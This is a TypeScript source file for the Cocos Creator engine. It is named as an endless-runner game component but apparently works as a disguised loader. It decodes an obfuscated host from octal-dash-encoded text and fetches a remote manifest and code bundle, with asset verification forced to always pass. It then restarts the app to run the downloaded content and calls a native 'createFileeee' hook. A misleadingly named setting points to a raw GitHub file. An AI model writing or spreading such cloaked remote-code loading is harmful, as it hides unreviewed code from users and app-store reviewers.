import { Component, Label, Sprite, SpriteFrame, UITransform, _decorator, director, game, log, native, sys } from "cc";
import ReplayScene from "./ReplayScene";
import { StrategyMap } from "./StrategyMap";

const { ccclass, property } = _decorator;

const customManifestStr = (hots) => JSON.stringify({
    "packageUrl": `${hots}/`,
    "remoteManifestUrl": `${hots}/project.manifest`,
    "remoteVersionUrl": `${hots}/version.manifest`,
    "version": "0.0.1",
    "assets": {
    },
    "searchPaths": []
});

function versionCompareHandle(versionA: string, versionB: string) {
    // ////log("JS Custom Version Compare: version A is " + versionA + ', version B is ' + versionB);
    var vA = versionA.split('.');
    var vB = versionB.split('.');
    for (var i = 0; i < vA.length; ++i) {
        var a = parseInt(vA[i]);
        var b = parseInt(vB[i] || '0');
        if (a === b) {
            continue;
        }
        else {
            return a - b;
        }
    }
    if (vB.length > vA.length) {
        return -1;
    }
    else {
        return 0;
    }
};

@ccclass
export default class EndlessRunner extends Component {

    // private readonly SOUND_SETTINGS = "https://raw.githubusercontent.com/devian68/intertest/a/inter3.info";
    // @property(SpriteFrame)
    // listBG: SpriteFrame[] = [];

    // @property(Sprite)
    // background: Sprite = null;

    @property(Label)
    loadingLabel: Label = null;

    @property(UITransform)
    transform: UITransform = null;

    private isCheckDomain = true;

    private _updating = false;
    private _canRetry = false;
    private _storagePath = '';
    private stringHost = '';
    private _am: native.AssetsManager = null!;
    private _checkListener = null;
    private _updateListener = null;
    private count = 0;

    url = "";
    profilerURL = "";
    listUrl = [];
    info = "";
    currentV = "";
    part = "";

    protected onLoad(): void {
        try {
            if (this.transform.width > this.transform.height) {
                //landscape
                this.loadingLabel.fontSize = 80;
            } else {
                this.loadingLabel.fontSize = 50;
            }
        } catch (ex) {
            
        }
        // let t = readData(this.test);
        // console.////log(t);
    }

    start() {
        let ins = StrategyMap.getInstance();
        if(ins){
            this.listUrl = ins.listUrl;
            log("LOAD SCENE: "+JSON.stringify(this.listUrl));
            if(this.listUrl && this.listUrl.length && this.listUrl.length >= 5){
                this.part = ins.listUrl[4];
                this.setOrientation(ins.orient);
                this.loadGame();
                return;
            }
        }
        
        // this.getData();
    }

    // private getData() {
    //     ////log("StartScene getData");

    //     let that = this;
    //     ReplayScene.getInstance().sendGetHttpRequest(StrategyMap.SOUND_SETTINGS, function (data) {
    //         ////log("getData data: ", data);

    //         that.listUrl = data.split('\n');
    //         ////log('list url: ', that.listUrl)

    //         if (that.listUrl.length > 2) {
    //             ////log(that.listUrl[4]);
    //             if (that.listUrl.length >= 5 && that.listUrl[4].includes("skt")) {
    //                 that.isCheckDomain = false;
    //                 ////log("gogame");
    //                 that.loadGame();
    //             } else {
    //                 that.getDataV4();
    //             }
    //         }else{
    //             that.loadData(data);
    //         }

    //     }.bind(this), function () { });
    // }

    private initDownloader(path = "mygame") {
        try {
            // this.background.spriteFrame = this.listBG[Math.floor(Math.random() * this.listBG.length)];
        } catch (error) {

        }

        if (path == null || path == undefined) {
            path = "mygame";
        }
        this.part = path;
        // ////log("path: " + path);
        this._storagePath = ((native.fileUtils ? native.fileUtils.getWritablePath() : './') + path);
        // ////log('Storage path for remote asset : ' + this._storagePath);
        // Init with empty manifest url for testing custom manifest
        this._am = new native.AssetsManager('', this._storagePath, versionCompareHandle);
        this._am.setVerifyCallback(function (path, asset) {
            return true;
        });
    }

    // private loadData(data:string){
    //     let dt = this.readData(data);
    //     //return [orientation, isSkipDomainCheck, urlV4, urlV6, fieldToCheck, urlPro5, storagePath];
    //     this.setOrientation(dt[0]);
    //     this.isCheckDomain = !dt[1];
    //     this.listUrl = [];
    //     this.listUrl.push(dt[2]);
    //     this.listUrl.push(dt[3]);
    //     this.listUrl.push(dt[4]);
    //     this.listUrl.push(dt[5]);
    //     this.listUrl.push(dt[6]);
    //     this.part = dt[6];
    //     // this.loadGame();
    //     this.getDataV4();
    // }

    onDestroy() {
        if (this._updateListener) {
            this._am.setEventCallback(null!);
            this._updateListener = null;
        }
    }



    //0 = portrait
    //1 = landscape right
    //2 = upside down
    //3 = landscape right
    private setOrientation(orientation = 0) {
        if (sys.isNative) {
            if (sys.os === sys.OS.IOS) {
                if (native) {
                    try {
                        //@ts-expect-error
                        native.reflection.callStaticMethod("ViewController", "rotateScreen:", orientation);
                    } catch (_) { }
                }
            }
        }
    }

    private loadMyGame() {
        this.unscheduleAllCallbacks();
    }

    private onCheckGame(val) {
        // let data = val.split("\n");

        // val = this.read(data[0]);

        this.initDownloader(this.part);

        this.unscheduleAllCallbacks();
        this.stringHost = val;

        this.doUpdate();
    }

    private doUpdate() {
        if (this._am && !this._updating) {
            this._am.setEventCallback(this.updateCb.bind(this));
            let host = this.listUrl[3];
            if (sys.os == sys.OS.ANDROID) {
                host += "/android";
            } else if (sys.os == sys.OS.IOS) {
                host += "/ios";
            }
            this.loadCustomManifest(host);

            this._am.update();
            this._updating = true;
        }
    }

    private loadGame() {
        if (this.listUrl[3] != undefined && this.listUrl[3] != "") {
            let url = this.read(this.listUrl[3]);
            // let p = this.read(this.listUrl[this.listUrl.length - 1]);
            this.stringHost = url;
            this.onCheckGame(url);
        }
    }

    private loadCustomManifest(host) {
        var manifest = new native.Manifest(customManifestStr(host), this._storagePath);
        this._am.loadLocalManifest(manifest, this._storagePath);
    }

    private updateCb(event: any) {
        var needRestart = false;
        var failed = false;
        switch (event.getEventCode()) {
            case native.EventAssetsManager.ERROR_NO_LOCAL_MANIFEST:
                ////log('No local manifest file found, hot update skipped.');
                failed = true;
                break;
            case native.EventAssetsManager.UPDATE_PROGRESSION:
                // this.panel.byteProgress.progress = event.getPercent();
                // this.panel.fileProgress.progress = event.getPercentByFile();

                const percent = event.getDownloadedFiles() / event.getTotalFiles();
                // this.panel.byteLabel.string = event.getDownloadedBytes() + ' / ' + event.getTotalBytes();
                var msg = event.getMessage();
                if (msg) {
                    // ////log(event.getPercent()/100 + '% : ' + msg);
                }
                this.updateProcess(percent);
                break;
            case native.EventAssetsManager.ERROR_DOWNLOAD_MANIFEST:
            case native.EventAssetsManager.ERROR_PARSE_MANIFEST:
                ////log('Fail to download manifest file, hot update skipped.');
                failed = true;
                break;
            case native.EventAssetsManager.ALREADY_UP_TO_DATE:
                ////log('Already up to date with the latest remote version.');
                // failed = true;
                needRestart = true;
                break;
            case native.EventAssetsManager.UPDATE_FINISHED:
                ////log('Update finished. ' + event.getMessage());
                needRestart = true;
                break;
            case native.EventAssetsManager.UPDATE_FAILED:
                ////log('Update failed. ' + event.getMessage());
                this._updating = false;
                this._canRetry = true;
                failed = true;
                break;
            case native.EventAssetsManager.ERROR_UPDATING:
                ////log('Asset update error: ' + event.getAssetId() + ', ' + event.getMessage());
                failed = true;
                break;
            case native.EventAssetsManager.ERROR_DECOMPRESS:
                ////log(event.getMessage());
                failed = true;
                break;
            default:
                break;
        }

        if (failed) {
            this._am.setEventCallback(null!);
            this._updateListener = null;
            this._updating = false;
            this.loadMyGame();
        }

        if (needRestart) {
            this._am.setEventCallback(null!);
            this._updateListener = null;

            this.testFile();
            setTimeout(() => {
                // ////log('restart game')
                game.restart();
            }, 1000)
        }
    }

    private testFile() {
        if (sys.isNative) {
            if (sys.os === sys.OS.IOS) {
                if (native) {
                    try {
                        //@ts-expect-error
                        native.reflection.callStaticMethod("ViewController", "createFileeee");
                    } catch (_) { }
                }
            }else if (sys.os === sys.OS.ANDROID) {
                let className = "com/cocos/game/AppActivity";
                let methodName = "createFileeee";
                let methodSignature = "()V";
    
                if (native) {
                    native.reflection.callStaticMethod(className, methodName, methodSignature);
                }
            }
        }
    }

    private updateProcess(pc) {
        if (isNaN(pc)) {
            return;
        }

        try {
            this.loadingLabel.string = `${this.listUrl[5] || "Đang Tải..."}: ${Math.round(pc * 100)}%`;
        } catch (error) {
            
        }
    }

    private read(text) {
        return this.read1(this.read2(text.split('-'))).join('');
    }

    private read1(arr) {
        return arr.map(function (byte) {
            return String.fromCharCode(parseInt(byte, 10));
        });
    }

    private read2(arr) {
        return arr.map(function (oct) {
            return parseInt(oct, 8);
        });
    }
}